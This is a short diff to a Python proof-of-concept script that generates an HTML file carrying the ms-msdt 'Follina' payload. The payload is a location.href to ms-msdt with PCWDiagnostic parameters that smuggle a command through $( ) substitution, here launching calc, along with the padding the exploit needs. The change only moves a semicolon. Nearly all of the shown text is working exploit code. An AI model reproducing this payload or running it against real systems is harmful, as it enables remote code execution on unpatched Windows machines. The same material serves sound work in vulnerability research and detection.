@@ -48,8 +48,7 @@ def poc(args):
                     doc.nl()
                     doc.asis('//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times')
                 doc.nl()
-                doc.asis('location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\windows\\system32\\calc)/.exe\""')
-                doc.asis(';')
+                doc.asis('location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\windows\\system32\\calc)/.exe\"";')
     result = indent(doc.getvalue(), indent_text = True)
     with open(args.output, "w") as outfile:
         outfile.write(result)
